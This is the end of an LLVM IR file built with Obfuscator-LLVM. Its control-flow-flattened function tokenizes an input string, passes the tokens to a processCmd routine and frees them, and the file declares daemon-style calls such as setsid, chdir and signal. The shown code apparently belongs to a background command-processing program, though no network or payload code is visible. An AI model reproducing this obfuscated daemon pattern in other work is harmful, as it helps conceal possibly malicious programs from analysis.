  %336 = load i8*, i8** %22, align 8
  %337 = icmp ne i8* %336, null
  %338 = select i1 %337, i32 264731781, i32 -1437423741
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load i8*, i8** %22, align 8
  %341 = load i8, i8* %340, align 1
  %342 = zext i8 %341 to i32
  %343 = icmp ne i32 %342, 10
  %344 = select i1 %343, i32 -2111110195, i32 1983239081
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i8*, i8** %22, align 8
  %347 = call i64 @strlen(i8* %346) #10
  %348 = add i64 %347, 1
  %349 = call noalias i8* @malloc(i64 %348) #4
  %350 = load i32, i32* %21, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %351
  store i8* %349, i8** %352, align 8
  %353 = load i32, i32* %21, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %354
  %356 = load i8*, i8** %355, align 8
  %357 = load i8*, i8** %22, align 8
  %358 = call i64 @strlen(i8* %357) #10
  %359 = add i64 %358, 1
  call void @llvm.memset.p0i8.i64(i8* %356, i8 0, i64 %359, i32 1, i1 false)
  %360 = load i32, i32* %21, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %361
  %363 = load i8*, i8** %362, align 8
  %364 = load i8*, i8** %22, align 8
  %365 = call i8* @strcpy(i8* %363, i8* %364) #4
  %366 = load i32, i32* %21, align 4
  %367 = add nsw i32 %366, 1
  store i32 %367, i32* %21, align 4
  store i32 1983239081, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0)) #4
  store i8* %369, i8** %22, align 8
  store i32 1734929181, i32* %switchVar
  br label %loopEnd

; <label>:370:                                    ; preds = %loopEntry
  %371 = load i32, i32* %21, align 4
  %372 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i32 0, i32 0
  call void @processCmd(i32 %371, i8** %372)
  %373 = load i32, i32* %21, align 4
  %374 = icmp sgt i32 %373, 1
  %375 = select i1 %374, i32 1820797353, i32 -652645338
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  store i32 1, i32* %23, align 4
  store i32 1, i32* %23, align 4
  store i32 -824962215, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  %378 = load i32, i32* %23, align 4
  %379 = load i32, i32* %21, align 4
  %380 = icmp slt i32 %378, %379
  %381 = select i1 %380, i32 415146028, i32 -604294540
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %23, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %384
  %386 = load i8*, i8** %385, align 8
  call void @free(i8* %386) #4
  store i32 1640801391, i32* %switchVar
  br label %loopEnd

; <label>:387:                                    ; preds = %loopEntry
  %388 = load i32, i32* %23, align 4
  %389 = add nsw i32 %388, 1
  store i32 %389, i32* %23, align 4
  store i32 -824962215, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  store i32 -652645338, i32* %switchVar
  br label %loopEnd

; <label>:391:                                    ; preds = %loopEntry
  store i32 1063335935, i32* %switchVar
  br label %loopEnd

; <label>:392:                                    ; preds = %loopEntry
  store i32 -1322673185, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  %394 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.87, i32 0, i32 0))
  store i32 -1784272860, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  %396 = load i32, i32* %3, align 4
  ret i32 %396

loopEnd:                                          ; preds = %393, %392, %391, %390, %387, %382, %377, %376, %370, %368, %345, %339, %335, %330, %320, %314, %307, %306, %302, %297, %288, %283, %278, %275, %273, %268, %262, %260, %254, %252, %243, %233, %224, %223, %217, %214, %212, %207, %201, %198, %191, %184, %181, %171, %168, %167, %163, %160, %150, %144, %131, %128, %117, %111, %108, %99, %93, %92, %86, %82, %79, %75, %71, %70, %68, %67, %66, %64, %63, %59, %54, %50, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @printf(i8*, ...) #5

declare i32 @sleep(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146633309}
!2 = !{i32 -2146632618}
!3 = !{i32 -2146631869}
!4 = !{i32 -2146631046}
!5 = !{i32 -2146630236}
!6 = !{i32 -2146628811}
!7 = !{i32 -2146627949}
!8 = !{i32 -2146627228}
